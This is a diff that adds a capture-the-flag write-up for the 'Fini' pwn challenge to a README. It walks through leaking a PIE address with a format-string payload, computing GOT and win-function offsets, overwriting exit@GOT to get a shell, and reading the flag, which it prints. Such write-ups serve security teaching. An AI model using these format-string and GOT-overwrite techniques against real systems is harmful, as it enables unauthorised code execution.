@@ -67,7 +67,7 @@
 
 - Baby-BOF
 
-- Fini
+- [Fini](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#fini)
 
 - Minecrafty
 
@@ -80,6 +80,88 @@
 - [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)
 
 ## --------------------------------------------------
+
+### fini
+- FINI — tiny pwn (format-leak + 8‑byte write)
+
+- I opened the service and tried to talk to it like a normal user.
+
+```
+nc ctf.ac.upt.ro 9849
+```
+
+- It greeted me with “What’s your name?” and a tiny menu after that. My first instinct was to see if the greeting was a raw printf. I sent a short positional format string (short on purpose—long %p chains crash the greeting).
+
+```
+%15$p %25$p %35$p %45$p %55$p
+```
+
+- Bingo: it printed a handful of pointers and one of them started with 0x55/0x56 and ended with 1290. That usually means “you leaked _start from the PIE.” In one of my runs I got:
+
+```
+Hello, (nil) 0x1 0x… 0x7ffc178f7fd8 0x55de88911290
+```
+
+- From there I kept the math simple and *in the same connection* (ASLR means I never reuse numbers across sessions). For this challenge the useful offsets were stable:
+
+```
+- _start = 0x1290
+- win    = 0x1380  → win = L + 0x00F0
+- exit@GOT ≈ 0x3420 → exit = L + 0x2190   (fallback: L + 0x2180)
+```
+
+- I didn’t bother computing the whole base; I just used the leak (call it L) and added the small deltas. Example with the leak above:
+```
+L = 0x55de88911290
+exit = L + 0x2190 = 0x55de88913420
+win  = L + 0x00F0 = 0x55de88911380
+```
+
+- If I wanted a calculator in the terminal, I used this one‑liner:
+
+```
+    python3 - <<'PY'
+    L=int(input().strip(),16)
+    print("exit =",hex(L+0x2190))
+    print("win  =",hex(L+0xF0))
+    PY
+    # paste the leak like: 0x55de88911290
+```
+
+- With the two numbers ready, I used the built‑in write primitive from the menu:
+
+```
+1
+Addr (hex): 0x55de88913420
+Value (hex, 8 bytes): 0x55de88911380
+ok
+2
+```
+
+- That “2” triggers exit, which now jumps to win, which runs /bin/sh. I usually check quickly:
+
+```
+    id
+    ls
+    cat flag*
+```
+
+- Example : 
+
+```
+    nc ctf.ac.upt.ro 9910
+    %15$p %25$p %35$p %45$p %55$p
+    Hello, (nil) 0x1 ... 0x565102fed290
+    1
+    Addr (hex): 0x565102fef420      # L + 0x2190
+    Value (hex, 8 bytes): 0x565102fed380   # L + 0xF0
+    ok
+    2
+    id
+    ls
+    cat flag.txt
+```
+- ctf{c503f30375fd0e91985b4d8f0c9cdc234c8018a8b3e1df3f4d1a126725f47d42}
 
 ### theme-generator
 
